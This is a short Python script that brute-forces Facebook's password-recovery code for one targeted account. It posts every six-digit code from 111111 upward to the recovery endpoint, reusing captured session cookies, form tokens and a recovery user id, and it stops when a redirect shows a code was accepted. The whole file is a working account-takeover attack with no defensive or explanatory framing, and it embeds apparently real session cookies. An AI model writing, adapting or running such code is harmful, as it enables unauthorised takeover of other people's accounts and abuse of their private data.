import requests

cookies = {
    'fr': '1l4f2JPetk0OWtewR.AWVeare0aJWhgW9JyeRcSGGF_Iw.BmFpzL..AAA.0.0.BmGk65.AWXQ-KM7aZQ',
    'sb': 'jo4OZldJc3_Wlq6RGlE4qO-7',
    'wd': '1366x347',
    'datr': 'jo4OZiuOt7FZ0GgifBoVeRZh',
    'ps_l': '0',
    'ps_n': '0',
    'sfiu': 'AYiffl1YeqPg8VQAdEXKVkPbdsTMoe3uTH2dDf-KyVk1lJH2E6D5LUGiGctu8_THFKdgGRot5mZJBeujwrCX-TOuPMydHAupgux46lmso22wXQlDmYThkcKY4isKK5n21ax5dfMTTRpqhgy5vxNVkRQcA8HQ3yRbyOxufNUgFfceNyialHFrM79n97JWbcx5EWhtbAAQ_RUO4I7_xcG3TpmX',
}

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Referer': 'https://www.facebook.com/recover/code/?em^[0^]=p***^%^40*******&rm=send_email&cuid=AYj0cgw_hSG7FgpJ_X48fn27d5HM6_hN7a9GDiC4ewWghCt0HB5CbCdxOl43vzhFLJrAZCe1E4nv94wMt3-GScD84zVPX4J2sMI6IMDFmdCOkLXXr9IzNL4-vfV_VUQEqhsXsmM27Hsg2DlPV3vOmyLrK64c6CBa_HCjzzUNY06bY-TxXa8cV8urVU1LpBa6xKLedE0kFjAsQmu4SXMf-sW6&lara=1&hash=AUapQvmTVYzVNyBcCpg',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://www.facebook.com',
    'Alt-Used': 'www.facebook.com',
    'Connection': 'keep-alive',
    # 'Cookie': 'fr=1l4f2JPetk0OWtewR.AWVeare0aJWhgW9JyeRcSGGF_Iw.BmFpzL..AAA.0.0.BmGk65.AWXQ-KM7aZQ; sb=jo4OZldJc3_Wlq6RGlE4qO-7; wd=1366x347; datr=jo4OZiuOt7FZ0GgifBoVeRZh; ps_l=0; ps_n=0; sfiu=AYiffl1YeqPg8VQAdEXKVkPbdsTMoe3uTH2dDf-KyVk1lJH2E6D5LUGiGctu8_THFKdgGRot5mZJBeujwrCX-TOuPMydHAupgux46lmso22wXQlDmYThkcKY4isKK5n21ax5dfMTTRpqhgy5vxNVkRQcA8HQ3yRbyOxufNUgFfceNyialHFrM79n97JWbcx5EWhtbAAQ_RUO4I7_xcG3TpmX',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    # Requests doesn't support trailers
    # 'TE': 'trailers',
}



for i in range(111111,999999):
     data = {
      'jazoest': '2886',
      'lsd': 'AVq-FzgcT30',
      'n': str(i),
      'reset_action': '1',
      }
     response = requests.post(
        'https://www.facebook.com/recover/code/?em^%^5B0^%^5D=p^%^2A^%^2A^%^2A^%^40^%^2A^%^2A^%^2A^%^2A^%^2A^%^2A^%^2A&rm=send_email&spc=0&cuid=AYj0cgw_hSG7FgpJ_X48fn27d5HM6_hN7a9GDiC4ewWghCt0HB5CbCdxOl43vzhFLJrAZCe1E4nv94wMt3-GScD84zVPX4J2sMI6IMDFmdCOkLXXr9IzNL4-vfV_VUQEqhsXsmM27Hsg2DlPV3vOmyLrK64c6CBa_HCjzzUNY06bY-TxXa8cV8urVU1LpBa6xKLedE0kFjAsQmu4SXMf-sW6&fl=default_recover&wsr=0',
        cookies=cookies,
        headers=headers,
        data=data,
        allow_redirects=False
    
     )
     print(i)
     if(response.status_code == 302):
          break
  